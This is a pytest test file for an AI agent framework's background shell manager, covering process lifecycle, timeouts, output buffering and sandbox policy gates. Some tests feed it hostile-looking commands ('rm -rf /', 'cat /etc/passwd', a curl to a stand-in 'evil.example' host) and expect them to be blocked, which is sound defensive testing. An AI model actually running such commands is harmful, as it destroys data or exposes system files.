"""Tests for koboi.harness.background_shell / koboi.tools.builtin.background_shell (Wave 4)."""

from __future__ import annotations

import asyncio
import time

import pytest

from koboi.harness.background_shell import BackgroundShellManager
from koboi.modes import is_read_only_tool
from koboi.tools.builtin.background_shell import (
    check_background_shell,
    kill_background_shell,
    submit_background_shell,
)
from koboi.types import RiskLevel


async def _wait_until(predicate, timeout: float = 3.0, interval: float = 0.02) -> None:
    loop = asyncio.get_event_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if predicate():
            return
        await asyncio.sleep(interval)
    raise AssertionError("condition not met before timeout")


class TestPipeDrainNoDeadlock:
    async def test_continuous_pipe_drain_no_deadlock(self):
        """Regression: a child that writes FAR more than the kernel pipe buffer
        (~64KB) must not deadlock the manager. ``communicate()`` would block
        here forever -- the child fills the 64KB kernel pipe buffer, blocks on
        its own write, and never exits; meanwhile the parent is stuck in
        ``communicate()`` waiting for EOF. The continuous ``_drain`` reader is
        precisely what prevents that. Uses ``yes`` (writes infinitely) with a
        tiny ``output_buffer_chars`` so the ring buffer is exercised repeatedly.
        """
        manager = BackgroundShellManager(output_buffer_chars=4096)
        job = await manager.start("yes hello", max_lifetime_seconds=10)
        assert job.status == "running"  # start() returned -> did not hang

        # The writer must fill + rotate the ring buffer many times. Under a
        # communicate() regression the child would block on a full pipe before
        # ever producing 1000 chars of drained output (the read side never
        # consumes), so this wait_until would time out -- which we assert does
        # NOT happen.
        await _wait_until(
            lambda: manager._jobs[job.job_id].output_chars >= 1000,
            timeout=5.0,
        )
        # Let it keep writing so the cap is exercised many more times.
        await asyncio.sleep(0.3)
        capped = manager._jobs[job.job_id]
        assert capped.status == "running"
        # Buffer stays near the cap -- never grows unboundedly. Each "hello\n"
        # line is 6 bytes so overshoot is bounded by one line.
        assert capped.output_chars <= 4096 + 100, f"ring buffer cap not enforced: output_chars={capped.output_chars}"

        # Force-kill must return promptly (no hang waiting on drain / grace).
        t0 = time.monotonic()
        killed = await manager.kill(job.job_id, force=True)
        elapsed = time.monotonic() - t0
        assert elapsed < 2.0, f"kill took {elapsed:.2f}s -- drain may have deadlocked"
        assert killed.status == "killed"
        assert killed.returncode == -9  # SIGKILL -> negative signal death


class TestStartPollKill:
    async def test_round_trip(self):
        manager = BackgroundShellManager()
        job = await manager.start("echo hello && sleep 0.2 && echo done")
        assert job.status == "running"
        await _wait_until(lambda: (manager._jobs[job.job_id]).status == "exited")
        final = await manager.poll(job.job_id)
        assert final.status == "exited"
        assert final.returncode == 0
        assert "hello" in manager.tail(job.job_id)
        assert "done" in manager.tail(job.job_id)

    async def test_kill_running_process(self):
        manager = BackgroundShellManager(grace_seconds=0.2)
        job = await manager.start("sleep 30")
        await asyncio.sleep(0.05)
        killed = await manager.kill(job.job_id)
        assert killed.status == "killed"

    async def test_kill_already_exited_is_noop(self):
        manager = BackgroundShellManager()
        job = await manager.start("true")
        await _wait_until(lambda: manager._jobs[job.job_id].status == "exited")
        result = await manager.kill(job.job_id)
        assert result.status == "exited"  # unchanged, not overwritten to "killed"

    async def test_kill_unknown_job_returns_none(self):
        manager = BackgroundShellManager()
        assert await manager.kill("does-not-exist") is None

    async def test_poll_unknown_job_returns_none(self):
        manager = BackgroundShellManager()
        assert await manager.poll("does-not-exist") is None

    async def test_missing_binary_exits_127(self):
        # POSIX sh returns 127 for "command not found"; the manager does not
        # pre-validate the binary, so the failure surfaces as a completed job
        # with returncode=127 (not an exception).
        manager = BackgroundShellManager()
        job = await manager.start("this-binary-does-not-exist-xyz-123")
        await _wait_until(lambda: manager._jobs[job.job_id].status == "exited", timeout=5.0)
        final = await manager.poll(job.job_id)
        assert final.status == "exited"
        assert final.returncode == 127


class TestSigtermEscalation:
    async def test_sigterm_then_sigkill_for_stubborn_process(self):
        manager = BackgroundShellManager(grace_seconds=0.3)
        # Ignore SIGTERM so the manager must escalate to SIGKILL.
        job = await manager.start("trap '' TERM; sleep 30")
        await asyncio.sleep(0.1)
        killed = await manager.kill(job.job_id)
        assert killed.status == "killed"
        assert killed.returncode is not None
        assert killed.returncode != 0

    async def test_force_kill_skips_sigterm(self):
        # force=True goes straight to SIGKILL -- never sends SIGTERM, never
        # waits the grace window. Even with a TERM-trap installed and a
        # generous grace_seconds (which we MUST not pay), kill returns in ~1s.
        manager = BackgroundShellManager(grace_seconds=5.0)
        job = await manager.start("trap '' TERM; sleep 60")
        await asyncio.sleep(0.1)  # let the trap install
        t0 = time.monotonic()
        killed = await manager.kill(job.job_id, force=True)
        elapsed = time.monotonic() - t0
        assert elapsed < 2.0, f"force-kill took {elapsed:.2f}s -- did not skip SIGTERM grace?"
        assert killed.status == "killed"
        assert killed.returncode == -9  # direct SIGKILL, no TERM escalation


class TestMaxLifetime:
    async def test_auto_kill_on_timeout(self):
        manager = BackgroundShellManager(grace_seconds=0.2)
        job = await manager.start("sleep 30", max_lifetime_seconds=0.1)
        await _wait_until(lambda: manager._jobs[job.job_id].status == "timeout", timeout=3.0)
        final = await manager.poll(job.job_id)
        assert final.status == "timeout"

    async def test_zero_or_negative_lifetime_rejected(self):
        # 0/negative scheduled a watchdog that fired instantly (mislabeled
        # "timeout"); must be rejected at start instead.
        manager = BackgroundShellManager()
        for bad in (0, -1, -5):
            with pytest.raises(ValueError, match="max_lifetime_seconds must be positive"):
                await manager.start("sleep 30", max_lifetime_seconds=bad)
        await manager.kill_all()


class TestOutputBuffer:
    async def test_output_bounded_and_truncated(self):
        manager = BackgroundShellManager(output_buffer_chars=50)
        job = await manager.start("for i in 1 2 3 4 5 6 7 8 9 10; do echo line-$i-padding-to-grow-output; done")
        await _wait_until(lambda: manager._jobs[job.job_id].status == "exited")
        assert manager._jobs[job.job_id].output_chars <= 50 + 100  # last line may push slightly over before trim


class TestMaxConcurrent:
    async def test_cap_enforced(self):
        manager = BackgroundShellManager(max_concurrent=1)
        await manager.start("sleep 5")
        with pytest.raises(ValueError, match="max_concurrent"):
            await manager.start("sleep 5")
        await manager.kill_all()


class TestPolicyGate:
    async def test_policy_blocked_command_rejected_before_spawn(self):
        manager = BackgroundShellManager()
        with pytest.raises(ValueError):
            await manager.start("rm -rf /")
        assert manager._jobs == {}  # never registered -- rejected before spawn

    async def test_sensitive_path_rejected_before_spawn(self):
        # Additional vector: the shared ``check_command_blocked`` gate also
        # catches sensitive-path reads (``cat /etc/passwd``) before Popen --
        # never registered, surface as ValueError with the sensitive-path msg.
        manager = BackgroundShellManager()
        with pytest.raises(ValueError, match="sensitive path"):
            await manager.start("cat /etc/passwd")
        assert manager._jobs == {}


class TestKillAll:
    async def test_kill_all_stops_every_running_job(self):
        manager = BackgroundShellManager()
        j1 = await manager.start("sleep 30")
        j2 = await manager.start("sleep 30")
        await manager.kill_all()
        assert manager._jobs[j1.job_id].status == "killed"
        assert manager._jobs[j2.job_id].status == "killed"


class TestToolsIntegration:
    async def test_submit_check_kill_via_tools(self):
        manager = BackgroundShellManager()
        deps = {"background_shell_manager": manager}
        result = await submit_background_shell("sleep 5", _deps=deps)
        assert result.startswith("Background job started: id=")
        job_id = result.split("id=")[1].split()[0]

        status = await check_background_shell(job_id, _deps=deps)
        assert "status=running" in status

        killed = await kill_background_shell(job_id, _deps=deps)
        assert "status=killed" in killed

    async def test_tools_return_error_without_manager(self):
        assert (await submit_background_shell("echo hi", _deps=None)).startswith("Error:")
        assert (await check_background_shell("x", _deps=None)).startswith("Error:")
        assert (await kill_background_shell("x", _deps=None)).startswith("Error:")

    async def test_submit_rejects_cwd_outside_sandbox(self):
        # The spawned process's cwd is the ONLY containment gate for its working
        # directory (the launch command may be benign). A sandbox that rejects the
        # path must stop the spawn -- never register the job.
        manager = BackgroundShellManager()

        class _RejectingSandbox:
            def validate_path(self, path):
                if path.startswith("/etc"):
                    raise PermissionError("path is outside the sandbox directory")
                return path

            def build_env(self, cfg=None):
                return {}

            def network_allowed(self, command):
                return True

        deps = {"background_shell_manager": manager, "sandbox": _RejectingSandbox()}
        result = await submit_background_shell("echo hi", cwd="/etc", _deps=deps)
        assert result.startswith("Error:")
        assert manager._jobs == {}  # never started

    async def test_check_unknown_job_id(self):
        manager = BackgroundShellManager()
        result = await check_background_shell("nope", _deps={"background_shell_manager": manager})
        assert result.startswith("Error: no background job")

    async def test_network_policy_gate_consulted_before_start(self):
        # P1: submit must gate the LAUNCH command through sandbox.network_allowed
        # -- the live process then runs outside the per-call pipeline for its
        # whole lifetime, so this is the single enforcement point for egress tiers.
        class SpySandbox:
            def __init__(self) -> None:
                self.calls = 0

            def validate_path(self, path):
                return path

            def build_env(self, cfg=None):
                return {"PATH": "/usr/bin"}

            def network_allowed(self, command):
                self.calls += 1
                return False  # deny all egress

        spy = SpySandbox()
        manager = BackgroundShellManager()
        result = await submit_background_shell(
            "curl https://evil.example/x",
            _deps={"sandbox": spy, "background_shell_manager": manager},
        )
        assert result.startswith("Error: command blocked by sandbox network policy")
        assert spy.calls == 1, "submit must consult sandbox.network_allowed before starting"

    async def test_starts_when_sandbox_permits_network(self):
        class PermissiveSandbox:
            def validate_path(self, path):
                return path

            def build_env(self, cfg=None):
                return None

            def network_allowed(self, command):
                return True

        manager = BackgroundShellManager()
        result = await submit_background_shell(
            "echo hi", _deps={"sandbox": PermissiveSandbox(), "background_shell_manager": manager}
        )
        assert result.startswith("Background job started")
        await manager.kill_all()

    async def test_sandbox_without_network_allowed_attr_not_gated(self):
        # A sandbox with no network_allowed attr (e.g. passthrough) is not gated.
        class BareSandbox:
            def validate_path(self, path):
                return path

            def build_env(self, cfg=None):
                return None

        manager = BackgroundShellManager()
        result = await submit_background_shell(
            "echo hi", _deps={"sandbox": BareSandbox(), "background_shell_manager": manager}
        )
        assert result.startswith("Background job started")
        await manager.kill_all()


class TestRiskLevelsAndIdempotency:
    def test_submit_is_destructive_non_idempotent(self):
        td = submit_background_shell._tool_def
        assert td.risk_level == RiskLevel.DESTRUCTIVE
        assert td.idempotent is False

    def test_check_is_safe_idempotent(self):
        td = check_background_shell._tool_def
        assert td.risk_level == RiskLevel.SAFE
        assert td.idempotent is True

    def test_kill_is_moderate_idempotent(self):
        td = kill_background_shell._tool_def
        assert td.risk_level == RiskLevel.MODERATE
        assert td.idempotent is True


class TestModeBlocking:
    def test_none_of_the_tools_are_read_only(self):
        assert is_read_only_tool("submit_background_shell") is False
        assert is_read_only_tool("check_background_shell") is False
        assert is_read_only_tool("kill_background_shell") is False


class TestFacadeWiring:
    def test_dep_absent_when_disabled(self):
        from koboi.facade import KoboiAgent

        agent = KoboiAgent.from_dict(
            {
                "agent": {"name": "t"},
                "llm": {"provider": "openai", "model": "m", "api_key": "k"},
                "memory": {"backend": "in_memory"},
            }
        )
        assert agent._core.tools.get_dep("background_shell_manager") is None

    def test_dep_present_when_enabled(self):
        from koboi.facade import KoboiAgent

        agent = KoboiAgent.from_dict(
            {
                "agent": {"name": "t", "background_shell": {"enabled": True, "max_concurrent": 2}},
                "llm": {"provider": "openai", "model": "m", "api_key": "k"},
                "memory": {"backend": "in_memory"},
            }
        )
        manager = agent._core.tools.get_dep("background_shell_manager")
        assert isinstance(manager, BackgroundShellManager)
        assert manager._max_concurrent == 2


class TestCloseReapsLiveJobs:
    async def test_close_kills_running_jobs(self):
        from koboi.facade import KoboiAgent

        agent = KoboiAgent.from_dict(
            {
                "agent": {"name": "t", "background_shell": {"enabled": True}},
                "llm": {"provider": "openai", "model": "m", "api_key": "k"},
                "memory": {"backend": "in_memory"},
            }
        )
        manager = agent._core.tools.get_dep("background_shell_manager")
        job = await manager.start("sleep 30")
        await agent.close()
        assert manager._jobs[job.job_id].status == "killed"
